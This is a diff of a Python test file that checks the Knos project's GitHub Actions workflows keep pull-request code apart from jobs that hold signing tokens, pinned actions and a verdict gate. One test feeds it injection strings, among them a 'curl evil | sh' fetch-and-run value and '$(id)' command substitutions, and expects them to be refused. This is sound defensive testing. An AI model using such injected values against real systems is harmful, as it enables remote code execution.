@@ -30,6 +30,7 @@ ATTEST = "attest.yml"                                         # the fourth publi
 PUBLISHED = (*REUSABLE, ATTEST)
 CALLED = "drexthealpha/knos-workflows/.github/workflows/"
 ROTATE = "drexthealpha/knos-oidc-rotate/.github/workflows/"
+SUPPLIER = "drexthealpha/Knos/.github/workflows/supplier.yml"      # what examples/knos-supplier.yml calls, at a release's tag
 PLACEHOLDER = "KNOS_WORKFLOWS_SHA"                 # stands for the published commit until a release names it
 OWN = {"knos-workflow.yml": "knos.yml", "knos-check.yml": "knos-check.yml"}       # an example, and Knos's own copy of it
 SHA = r"[0-9a-f]{40}"
@@ -57,6 +58,10 @@ SIGNS = {("fund.yml", "command"), ("prove.yml", "settle"), ("prove.yml", "attest
 LOCKED = SIGNS | {(ATTEST, "refused")}      # the called jobs that install from the lock: those, and the one that posts a refused verdict
 ATTEST_COMMAND = 'knos attest --repository "$R" --pull "$P" --order "$O" --kind "$K" ${PAYEES:+--payees "$PAYEES"}'
 ATTEST_INPUTS = ("repository", "pull", "order", "kind", "payees")
+# The verdict that crosses from a job that runs a pull request's code to the job that signs (knos.verdict_gate): the
+# judge writes one line of fixed fields, and the signing job's step before its command reads it as data and checks it.
+EMIT = '"$(uv tool dir)/knos/bin/python" -m knos.verdict_gate emit --base base --issue "$ISSUE" --changed changed.txt'
+GATE = {("prove.yml", "attest"): "python -m knos.verdict_gate check", (ATTEST, "attest"): "python -m knos.verdict_gate shape"}
 # What a job that signs runs to install: every file named by its hash, nothing resolved, nothing built, and the list
 # written into the step itself (the word KNOS_LOCK stands where `scripts/pinned_workflows.py build` writes it).
 LOCKED_INSTALL = (
@@ -152,7 +157,7 @@ def test_what_a_repository_installs_is_what_knos_runs_on_itself():
     # one payment file and one optional check: nothing else to install, and nothing still calls the first deployment's relay
     assert sorted(p.name for p in EXAMPLES.glob("*.yml")) == ["knos-attest.yml", "knos-attestor.yml", "knos-canary.yml", "knos-check.yml",
                                                               "knos-claim-org.yml", "knos-claim.yml", "knos-install.yml", "knos-meter-batch.yml",
-                                                              "knos-reproduce.yml", "knos-workflow.yml"]
+                                                              "knos-reproduce.yml", "knos-supplier.yml", "knos-workflow.yml"]
     # an organisation's claim file, which `knos claim --org` puts into <organisation>/knos-claim, is its example byte for byte
     assert (ROOT / "src" / "knos" / "settle" / "knos-claim-org.yml").read_bytes() == (EXAMPLES / "knos-claim-org.yml").read_bytes()
     assert not (WF / "relay.yml").exists() and not any("relay.yml" in p.read_text(encoding="utf-8") for p in _mine())
@@ -171,6 +176,11 @@ def test_every_action_is_a_commit_listed_in_action_pins_and_every_called_workflo
             if name.startswith(CALLED):
                 assert name[len(CALLED):] in PUBLISHED and (ref == PLACEHOLDER or re.fullmatch(SHA, ref)), (path.name, name, ref)
                 called.add(ref)
+            elif name == SUPPLIER:
+                # the supplier's one line calls Knos's own repository at the tag of a release (docs/RECORD.md, section 3): the
+                # tag names a commit in scripts/action_pins.json, and the release moves both
+                assert path.name == "knos-supplier.yml" and re.fullmatch(r"v\d+\.\d+\.\d+", ref), (path.name, name, ref)
+                assert any(re.fullmatch(r"drexthealpha/Knos@v\d+\.\d+\.\d+", k) and re.fullmatch(SHA, v) for k, v in pins.items()), "no commit is listed for a Knos tag"
             elif name.startswith(ROTATE):
                 # (an organisation's claim file calls the claim workflow's later commit, the one knos_pay's BindOrg pins beside the first)
                 pinned = ids["claim_sha_org"] if path.name == "knos-claim-org.yml" else {"rotate.yml": ids["rotate_sha"], "claim.yml": ids["claim_sha"]}[name[len(ROTATE):]]
@@ -258,8 +268,10 @@ def test_a_token_is_asked_for_only_by_jobs_that_run_no_pull_request_code_and_che
     for name, job in sorted(SIGNS):
         steps = _steps(_jobs(name)[job])
         # uv, the install, the command: no checkout, no git, no artifact, nothing a pull request wrote
+        # (and, where a verdict comes from a job that ran such code, the step that reads it as data before the command)
         assert [s["uses"].split("@")[0] for s in steps if "uses" in s] == ["astral-sh/setup-uv"], (name, job)
-        assert _scripts(_jobs(name)[job]) == [LOCKED_INSTALL, {**COMMAND, (ATTEST, "attest"): ATTEST_COMMAND}[name, job]], (name, job)
+        assert _scripts(_jobs(name)[job]) == [LOCKED_INSTALL, *([GATE[name, job]] if (name, job) in GATE else []),
+                                              {**COMMAND, (ATTEST, "attest"): ATTEST_COMMAND}[name, job]], (name, job)
     # in a calling file such a job is a call to a pinned workflow and nothing else
     for path in _mine():
         for name, job in _doc(path)["jobs"].items():
@@ -270,18 +282,23 @@ def test_a_token_is_asked_for_only_by_jobs_that_run_no_pull_request_code_and_che
                 assert "steps" not in job and job["uses"].startswith((CALLED, ROTATE)), (path.name, name)
 
 
-def test_the_job_that_runs_pull_request_code_can_only_read_and_hands_nothing_on():
+def test_the_job_that_runs_pull_request_code_can_only_read_and_hands_on_one_line_of_data():
     jobs = _jobs("prove.yml")
     judge = jobs["judge"]
     assert judge["permissions"] == {"contents": "read"}
-    assert "secrets." not in json.dumps(judge) and "outputs" not in judge and judge["cache-mode"] == "read"
+    assert "secrets." not in json.dumps(judge) and judge["cache-mode"] == "read"
+    assert judge["outputs"] == {"verdict": "${{ steps.verdict.outputs.verdict }}"} and not _steps(judge, "actions/upload-artifact@")
     assert judge["needs"] == "review" and judge["if"] == "needs.review.outputs.tests != ''"
     # The default branch as this run saw it, with its history and no token left in it. The pinned actions/checkout
     # refuses a fork's pull request in a `workflow_run` run; it is not asked to check one out, here or anywhere.
     [base] = _steps(judge, "actions/checkout@")
     assert base["with"] == {"ref": "${{ github.sha }}", "path": "base", "fetch-depth": 0, "persist-credentials": False}
     assert "allow-unsafe-pr-checkout" not in "".join(p.read_text(encoding="utf-8") for p in _mine())
-    fetch, install, probe, command = [s for s in _steps(judge) if "run" in s]
+    fetch, install, probe, command, emit = [s for s in _steps(judge) if "run" in s]
+    # after the suite passed (no `if`: a step runs only when those before it succeeded), the verdict line: given the same
+    # three values the judge was given and no token
+    assert emit["run"] == EMIT and emit["id"] == "verdict" and "if" not in emit and _steps(judge)[-1] is emit
+    assert emit["env"] == {"ISSUE": "${{ needs.review.outputs.tests }}", "PULL": "${{ needs.review.outputs.pull }}", "HEAD": "${{ needs.review.outputs.head }}"}
     assert [install["run"], command["run"]] == [JUDGE_INSTALL.format(release=_release()), COMMAND["prove.yml", "judge"]]
     assert probe["name"].startswith("the sandbox has no network") and "env" not in probe      # it is given nothing, and asks for nothing
     # the pull request's head: the commit the review named, fetched as that pull request's head and unpacked as plain
@@ -310,13 +327,22 @@ def test_the_job_that_runs_pull_request_code_can_only_read_and_hands_nothing_on(
             if (name, job_name) not in (("prove.yml", "judge"), (ATTEST, "rerun")):
                 assert not _steps(job, "actions/checkout@"), (name, job_name)
                 assert not re.search(r"\bgit\b|refs/pull|gh pr checkout", "\n".join(_scripts(job))), (name, job_name)
-    # The job that mints takes one fact from it: that it succeeded. Which pull request, which head commit and which
-    # issue come from review, a job that ran no pull request code: the same three values the judge was given.
+    # The job that mints takes two things from it: that it succeeded, and its verdict line, which one step reads as data
+    # before the command runs (tests/test_verdict_gate.py). Which pull request, which head commit and which issue come
+    # from review, a job that ran no pull request code: the same three values the judge was given.
     attest = jobs["attest"]
     assert attest["needs"] == ["review", "judge"]
     assert attest["if"] == "needs.review.outputs.tests != '' && needs.judge.result == 'success'"
-    assert re.findall(r"needs\.judge\.[\w.]+", json.dumps(attest)) == ["needs.judge.result"]
+    assert re.findall(r"needs\.judge\.[\w.]+", json.dumps(attest)) == ["needs.judge.result", "needs.judge.outputs.verdict"]
+    [gate] = [s for s in _steps(attest) if s.get("run") == GATE["prove.yml", "attest"]]
+    # the step that reads it: the verdict as an environment variable, the three values from review, the job's token to read
+    # GitHub's record again, and no secret; the command that can sign is the next step and is never handed the verdict
+    assert gate["env"] == {"GH_TOKEN": "${{ github.token }}", "VERDICT": "${{ needs.judge.outputs.verdict }}",
+                           "PULL": "${{ needs.review.outputs.pull }}", "HEAD": "${{ needs.review.outputs.head }}",
+                           "ISSUE": "${{ needs.review.outputs.tests }}"}
     [settle] = [s for s in _steps(attest) if s.get("run") == COMMAND["prove.yml", "attest"]]
+    assert _steps(attest).index(settle) == _steps(attest).index(gate) + 1 and "if" not in gate and "if" not in settle
+    assert "continue-on-error" not in json.dumps(attest) and "needs.judge" not in json.dumps(settle)
     assert settle["env"] == {"GH_TOKEN": "${{ github.token }}", "KNOS_RELAY_KEY": "${{ secrets.KNOS_RELAY_KEY }}",
                              "PULL": "${{ needs.review.outputs.pull }}", "HEAD": "${{ needs.review.outputs.head }}",
                              "ISSUE": "${{ needs.review.outputs.tests }}"}
@@ -354,9 +380,10 @@ def test_the_judge_job_says_where_its_boundary_is_and_checks_the_sandbox_has_no_
     from knos import judge
     prove = _comments(WF / "prove.yml")
     assert ("This job is a separate GitHub-hosted virtual machine, with no id-token and no secret" in prove
-            and "no output, no artifact, no cache" in prove and "no network" in prove)
+            and "one output, the verdict" in prove and "No artifact, no cache" in prove and "no network" in prove)
     job = _jobs("prove.yml")["judge"]
-    assert "id-token" not in job["permissions"] and "secrets." not in json.dumps(job) and "outputs" not in job
+    assert "id-token" not in job["permissions"] and "secrets." not in json.dumps(job)
+    assert job["outputs"] == {"verdict": "${{ steps.verdict.outputs.verdict }}"}       # one line of fixed fields: tests/test_verdict_gate.py
     script = _probe()
     # the layers the judge itself puts around pull request code (judge.Box.wrap): sudo, a network namespace, nobody, an empty environment
     assert script.startswith("set -euo pipefail\n") and "${{" not in script
@@ -424,9 +451,11 @@ def test_untrusted_text_reaches_a_shell_only_through_the_event_file_or_env():
                 assert not written_by_others.search(str(v)) or v in handed, (path.name, job_name, v)
     for (name, job), command in COMMAND.items():
         # install, one command: no logic in YAML. The judge's one more step, between them, checks its sandbox has no network.
-        want = [_install(name, job), _probe(), command] if job == "judge" else [_install(name, job), command]
+        # After it the judge writes its verdict line, and before its command the job that signs reads that line as data.
+        want = ([_install(name, job), _probe(), command, EMIT] if job == "judge" else
+                [_install(name, job), *([GATE[name, job]] if (name, job) in GATE else []), command])
         assert _scripts(_jobs(name)[job])[-len(want):] == want, (name, job)
-        assert len(_scripts(_jobs(name)[job])) == (4 if job == "judge" else 2), (name, job)
+        assert len(_scripts(_jobs(name)[job])) == (5 if job == "judge" else len(want)), (name, job)
     for name in ("knos command", "knos review", "knos check"):
         assert all(c == f"{name} {EVENT}" for c in COMMAND.values() if c.startswith(name + " "))
     assert all(c.endswith(EVENT) for c in COMMAND.values() if c.startswith("knos settle "))
@@ -496,7 +525,14 @@ def test_no_caller_can_change_which_code_judges():
             assert _steps(job).index(install) == _steps(job).index(uv) + 1
             # the command comes last and nothing else is installed or run after the install
             ends = [s.get("run", s.get("uses", "")).split("@")[0].split(" ")[0] for s in _steps(job)]
-            assert ends[-4:] == ["astral-sh/setup-uv", "uv", "set", "knos"] if job_name == "judge" else ends[-3:] == ["astral-sh/setup-uv", "uv", "knos"]
+            # (but the verdict line: the judge writes it after its command, with the python of that very install, and the
+            # job that signs reads it before its command, with the python of its own)
+            if job_name == "judge":
+                assert ends[-5:] == ["astral-sh/setup-uv", "uv", "set", "knos", '"$(uv'], (name, job_name)
+            elif (name, job_name) in GATE:
+                assert ends[-4:] == ["astral-sh/setup-uv", "uv", "python", "knos"], (name, job_name)
+            else:
+                assert ends[-3:] == ["astral-sh/setup-uv", "uv", "knos"], (name, job_name)
             assert not [s for s in _steps(job) if s is not install and ("pip install" in str(s.get("run", "")) or "setup-python" in str(s.get("uses", "")))]
     assert all(w == SETUP_UV for w in steps), "every job sets uv up the same way, with no cache"
     assert len(cutoffs) == 1
@@ -1000,7 +1036,7 @@ def test_attests_first_job_runs_the_suite_again_with_no_way_to_sign_and_hands_on
     assert steps.index(install) < steps.index(plan) < steps.index(fetch) < steps.index(probe) < steps.index(judge)
     # the verdict file is kept whether the suite passed or not; nothing is downloaded anywhere
     [keep] = _steps(job, "actions/upload-artifact@")
-    assert keep["if"] == "${{ !cancelled() }}" and keep["with"] == {"name": "knos-verdict", "path": "${{ runner.temp }}/rerun/verdict.json",
+    assert keep["if"] == "${{ !cancelled() }}" and keep["with"] == {"name": "knos-verdict-${{ github.run_attempt }}", "path": "${{ runner.temp }}/rerun/verdict.json",
                                                                    "if-no-files-found": "ignore"}
     # (two jobs of other files do download, each held to its own rule in the tests below: the reproduction's `sign`,
     # which hashes what it was handed before it asks for anything, and the meter's `close`, which can ask for nothing)
@@ -1105,10 +1141,14 @@ def test_attest_takes_facts_never_code_reads_the_public_record_and_asks_for_one_
     # it follows the job that runs the suite again, and only when that job succeeded: no `if` widens that, and of that job
     # it takes one output, as an environment variable of the command, which reads it as untrusted text
     assert job["needs"] == "rerun" and "if" not in job and "outputs" not in job
-    assert re.findall(r"needs\.[\w.]+", json.dumps(job)) == ["needs.rerun.outputs.verdict"]
+    assert set(re.findall(r"needs\.[\w.]+", json.dumps(job))) == {"needs.rerun.outputs.verdict"}
     # no checkout of anything, no git, nothing a pull request wrote on disk: uv, the hash-locked install, the command
     assert [s["uses"].split("@")[0] for s in _steps(job) if "uses" in s] == ["astral-sh/setup-uv"] and _steps(job, "astral-sh/setup-uv@")[0]["with"] == SETUP_UV
-    assert _scripts(job) == [LOCKED_INSTALL, ATTEST_COMMAND]
+    # (between them, one step holds the first job's verdict to what every reader reads the same way; it is given that
+    # text and nothing else: no token, no input)
+    assert _scripts(job) == [LOCKED_INSTALL, GATE[ATTEST, "attest"], ATTEST_COMMAND]
+    [shape] = [s for s in _steps(job) if s.get("run") == GATE[ATTEST, "attest"]]
+    assert shape["env"] == {"KNOS_RERUN": "${{ needs.rerun.outputs.verdict }}"} and "if" not in shape
     assert not re.search(r"\bgit\b|refs/pull|gh pr checkout", "\n".join(_scripts(job)))
     # what people wrote reaches the command as environment variables, one each, and never inside the script
     [step] = [s for s in _steps(job) if s.get("run") == ATTEST_COMMAND]
@@ -1455,7 +1495,7 @@ def test_the_lock_is_for_the_release_the_workflows_name_and_holds_the_wheel_and_
     good = lock.read_text(encoding="utf-8")
     last = good.splitlines()[-1]
     for wrong in (good.replace(last, ""), good + "typer==0.0.1 --hash=sha256:" + "0" * 64 + "\n", good.replace(last, last[:-1]),
-                  good.replace(last, last.replace(_release(), "9.9.9")), good.replace("solders==", "solderz=="), "knos==0.3.17 --hash=sha256:" + "a" * 64 + "\n"):
+                  good.replace(last, last.replace(_release(), "9.9.9")), good.replace("solders==", "solderz=="), "knos==0.3.18 --hash=sha256:" + "a" * 64 + "\n"):
         bad = tmp_path / "bad.txt"
         bad.write_text(wrong, encoding="utf-8")
         with pytest.raises(SystemExit, match="the lock is not"):
@@ -1492,7 +1532,7 @@ def test_a_rehearsal_variant_differs_in_how_knos_is_installed_and_in_nothing_els
             pub.main(["check", str(out)])                  # a checkout is checked against the set it was made as, named
     assert pub.main(["check", str(out), "--lock", str(_lock(tmp_path, pub))]) == 1
     capsys.readouterr()
-    for bad in ('knos"; curl evil | sh; "', "knos==0.3.17 # x", "$(id)", "knos\nrun: x", "a: b", "`id`", ""):
+    for bad in ('knos"; curl evil | sh; "', "knos==0.3.18 # x", "$(id)", "knos\nrun: x", "a: b", "`id`", ""):
         with pytest.raises(SystemExit):
             pub.main(["build", str(tmp_path / "bad"), "--source", bad])
     assert not (tmp_path / "bad").exists()
@@ -1797,3 +1837,83 @@ def test_the_test_workflow_runs_every_node_test_of_the_site_and_the_conformance_
     assert 'cp -r terms "$out/terms"' in site and "scripts/demo_data.py --check" in site
     paths = yaml.safe_load((WF / "network.yml").read_text(encoding="utf-8"))[True]["push"]["paths"]
     assert {"terms/**", "scripts/demo_data.py", "scripts/build_site.sh"} <= set(paths)
+
+
+# ---- untrusted code and the signing identity never share a job --------------------------------------------------------
+
+def _has_code_on_disk(job: dict) -> bool:
+    """Whether a job puts anything of a repository on its disk or runs it: a checkout, git, a pull request's ref, an
+    artifact another job wrote, a cache another run left."""
+    if any(_steps(job, uses) for uses in ("actions/checkout@", "actions/download-artifact@", "actions/cache@", "actions/cache/restore@")):
+        return True
+    return bool(re.search(r"\bgit\b|refs/pull|gh pr checkout|gh repo clone|\bdocker\b|\bpytest\b|\bnpm\b|\bmake\b", "\n".join(_scripts(job))))
+
+
+def test_no_job_of_a_published_workflow_has_repository_code_and_the_signing_identity_or_a_write_to_the_code():
+    """The rule, as shape: a job that checks out, fetches or runs anything of a repository has no id-token and can write
+    nothing; a job that has the id-token has no code on disk. Whatever a job that ran such code hands on is one output,
+    read by one step of the job that signs before the command that can sign."""
+    runs_code = set()
+    for name in PUBLISHED:
+        for job_name, job in _jobs(name).items():
+            mints = job["permissions"].get("id-token") == "write"
+            assert ((name, job_name) in SIGNS) == mints, (name, job_name)
+            if _has_code_on_disk(job):
+                runs_code.add((name, job_name))
+                assert job["permissions"] == {"contents": "read"}, (name, job_name)        # reads, and nothing else: no id-token, no write
+                assert "secrets." not in json.dumps(job) and "environment" not in job, (name, job_name)
+                assert job["cache-mode"] == "read" and "container" not in job and "services" not in job, (name, job_name)
+            if mints:
+                assert not _has_code_on_disk(job), (name, job_name)
+                assert not _steps(job, "actions/upload-artifact@"), (name, job_name)
+            assert job["permissions"].get("contents", "read") == "read", (name, job_name)
+    assert runs_code == {("prove.yml", "judge"), (ATTEST, "rerun")}
+    # every third-party action a published job uses is named by a full commit
+    for name in PUBLISHED:
+        for job in _jobs(name).values():
+            for s in _steps(job):
+                if "uses" in s:
+                    assert re.fullmatch(r"[\w.-]+/[\w./-]+@" + SHA, s["uses"]), (name, s["uses"])
+    # what crosses: one output of each job that runs code, read by the signing job in the step before its command
+    crossing = {("prove.yml", "judge"): ("attest", "VERDICT", "needs.judge.outputs.verdict"),
+                (ATTEST, "rerun"): ("attest", "KNOS_RERUN", "needs.rerun.outputs.verdict")}
+    for (name, job_name), (signer, var, expr) in crossing.items():
+        assert list(_jobs(name)[job_name]["outputs"]) == ["verdict"], (name, job_name)
+        signing = _jobs(name)[signer]
+        scripts = _scripts(signing)
+        assert scripts.index(GATE[name, signer]) == len(scripts) - 2, name          # the step before the last, which is the command
+        [gate] = [s for s in _steps(signing) if s.get("run") == GATE[name, signer]]
+        assert gate["env"][var] == f"${{{{ {expr} }}}}" and "secrets." not in json.dumps(gate)
+        # the verdict never reaches a script as text: only as an environment variable
+        for s in _steps(signing):
+            assert expr not in str(s.get("run", "")) and expr not in json.dumps(s.get("with") or {}), name
+    # and the callers: a job of an example that calls a published workflow hands it no code and no artifact
+    for example in OWN:
+        for job in _doc(EXAMPLES / example)["jobs"].values():
+            assert "steps" not in job and job["uses"].startswith(CALLED)
+
+
+def test_the_verdict_steps_run_the_installed_release_and_nothing_of_the_repository():
+    """`python -m knos.verdict_gate` is the module of the knos each job installed: in the judge, the python of the uv tool;
+    in the job that signs, the python of the hash-locked environment, first on PATH. Neither names a file of a checkout."""
+    from knos import verdict_gate
+    assert EMIT.startswith('"$(uv tool dir)/knos/bin/python" -m knos.verdict_gate emit ')
+    for command in GATE.values():
+        assert command.startswith("python -m knos.verdict_gate ") and "/" not in command and "$" not in command
+    assert 'echo "$RUNNER_TEMP/knos/bin" >> "$GITHUB_PATH"' in LOCKED_INSTALL
+    assert verdict_gate.main(["shape"], env={}) == 0
+    said = _comments(WF / "prove.yml")
+    for words in ("it takes that the job succeeded and one line of JSON, the verdict, which it reads as data",
+                  "no changed path is one the\n#            judge's rule refuses".replace("\n#            ", " "),
+                  "This step asks GitHub for no token; a verdict that does not hold ends the job"):
+        assert words in " ".join(said.split()), words
+
+
+def test_check_refuses_a_published_job_that_runs_a_module_or_a_command_the_wheel_does_not_have(monkeypatch):
+    pub = _script("pinned_workflows")
+    assert pub.modules_run() == []
+    real = pub.sources()
+    monkeypatch.setattr(pub, "sources", lambda: {**real, "prove.yml": real["prove.yml"].replace("knos.verdict_gate check", "knos.verdict_gates check")})
+    assert pub.modules_run() == [".github/workflows/prove.yml runs `python -m knos.verdict_gates`, which is not a module of src/knos"]
+    monkeypatch.setattr(pub, "sources", lambda: {**real, "attest.yml": real["attest.yml"].replace("knos.verdict_gate shape", "knos.verdict_gate bless")})
+    assert pub.modules_run() == [".github/workflows/attest.yml runs `python -m knos.verdict_gate bless`, a command that module does not have"]
